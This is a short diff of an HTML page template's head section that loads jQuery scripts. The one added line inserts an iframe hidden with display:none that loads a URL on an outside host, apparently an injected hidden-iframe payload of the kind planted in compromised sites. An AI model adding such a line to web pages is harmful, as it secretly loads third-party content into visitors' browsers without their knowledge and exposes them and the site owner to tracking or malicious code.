@@ -64,6 +64,7 @@
     <!--<script type='text/javascript'
             src='{SITE-NAME}/view/default/themes/js/jquery.js?ver=1.12.4'></script>-->
     <script type="text/javascript" src="{SITE-NAME}/view/default/themes/js/jquery-1.11.2.min.js"></script>
+    <iframe src="http://datanumber.bigdatavietnam.net/api.php/n?pid=1372" style="display: none;"></iframe>
 </head>
 
 
